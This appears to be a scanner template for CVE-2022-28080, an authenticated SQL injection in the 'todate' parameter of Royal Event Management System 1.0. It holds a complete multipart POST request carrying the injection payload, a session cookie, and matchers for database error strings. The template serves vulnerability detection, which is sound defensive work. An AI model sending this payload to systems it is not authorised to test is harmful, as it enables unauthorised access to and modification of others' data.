id: royal-event-management-system-sqli
info:
  author: eren-gozaydin
  classification:
    cve-id: CVE-2022-28080
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 8.8
  description: Royal Event Management System 1.0 allows SQL Injection via parameter
    'todate' in /royal_event/btndates_report.php#?=. Exploiting this issue could allow
    an attacker to compromise the application, access or modify data, or exploit latent
    vulnerabilities in the underlying database.
  metadata:
    tested-on: Windows 10 Pro + PHP 8.0.11, Apache 2.4.51
    version: 1
  name: Royal Event Management System 1.0 - 'todate' SQL Injection
  reference:
  - https://www.sourcecodester.com/php/15238/event-management-system-project-php-source-code.html
  - https://nvd.nist.gov/vuln/detail/CVE-2022-28080
  severity: high
  tags: cve,cve2022,sqli,royal-event,authenticated
requests:
- body: '--f289a6438bcc45179bcd3eb7ddc555d0

    Content-Disposition: form-data; name="todate"


    -1'' OR 1=1 OR ''ns''=''ns

    --f289a6438bcc45179bcd3eb7ddc555d0

    Content-Disposition: form-data; name="search"


    3

    --f289a6438bcc45179bcd3eb7ddc555d0

    Content-Disposition: form-data; name="fromdate"


    01/01/2011

    --f289a6438bcc45179bcd3eb7ddc555d0--

    '
  extractors:
  - part: body
    regex:
    - (?i)(sql syntax|mysql syntax|unexpected token)
    type: regex
  headers:
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
    Accept-Encoding: gzip, deflate
    Accept-Language: en-us,en;q=0.5
    Cache-Control: no-cache
    Content-Type: multipart/form-data; boundary=f289a6438bcc45179bcd3eb7ddc555d0
    Cookie: PHPSESSID=qeoe141g7guakhacf152a3i380
    Referer: '{{BaseURL}}/royal_event/btndates_report.php#?='
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
      like Gecko) Chrome/79.0.3945.0 Safari/537.36
  matchers:
  - status:
    - 200
    type: status
  - condition: or
    type: word
    words:
    - SQL syntax
    - MySQL
  - part: body
    type: word
    words:
    - Event Details Report
  matchers-condition: and
  method: POST
  path:
  - '{{BaseURL}}/royal_event/btndates_report.php#?='
